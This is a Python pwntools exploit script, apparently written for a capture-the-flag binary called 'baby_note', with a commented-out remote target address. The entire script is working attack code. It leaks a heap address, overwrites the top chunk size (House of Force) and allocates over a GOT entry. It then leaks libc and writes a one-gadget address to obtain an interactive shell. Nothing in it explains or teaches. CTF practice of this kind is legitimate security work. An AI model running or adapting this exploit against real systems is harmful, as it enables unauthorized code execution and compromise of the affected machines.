from pwn import *
r = process("./baby_note")
#r = remote("104.250.105.158",6002)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def create( idx , size ):
    r.sendlineafter("[?] Choice : ","1")
    r.sendlineafter("index : ",str(idx))
    r.sendlineafter("size : ",str(size))

def view( idx ):
    r.sendlineafter("[?] Choice : ","4")
    r.sendlineafter("index : ",str(idx))
    return r.recvline().strip()

def edit( idx , size , p ):
    log.info("here")
    r.sendlineafter("[?] Choice : ","2")
    r.sendlineafter("index : ", str(idx))
    r.sendlineafter("size : " , str(size))
    r.sendlineafter("text : ",p)

def l33t():
    r.sendlineafter("[?] Choice : ","1337")
    return r.recvline().strip()

def main():
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(r)
    create(0 , 256)
    #---- leak heap address and claculate top chunk -----
    heap_address = int(l33t(),16)
    top_chunk = heap_address + 264
    log.info("heap address : " + str(hex(heap_address)))
    log.info("top chunk    : " + str(hex(top_chunk)))


    #---- overwrite the top chunk
    p = ""
    p += "a" * 264
    p += p64( -1 , signed = True)
    edit( 0 , len( p ) , p )
    stack_fail_got = 0x000000602038
    evilsize = stack_fail_got - 16 - top_chunk

    create(1,evilsize)
    create(2,100)
    getchar_libc = u64(view(2) + "\x00\x00")


    libc_base = getchar_libc - 0x076160 # libc.symbols['getchar']
    libc_system = libc_base + 0xf1147 #libc.symbols['system']

    log.info("libc base : " + str(hex(libc_base)))
    log.info("system    : " + str(hex(libc_system)))

    p = p64(libc_system)
    edit(2 , len(p) , p)
    r.interactive()


if __name__ == '__main__':
    main()
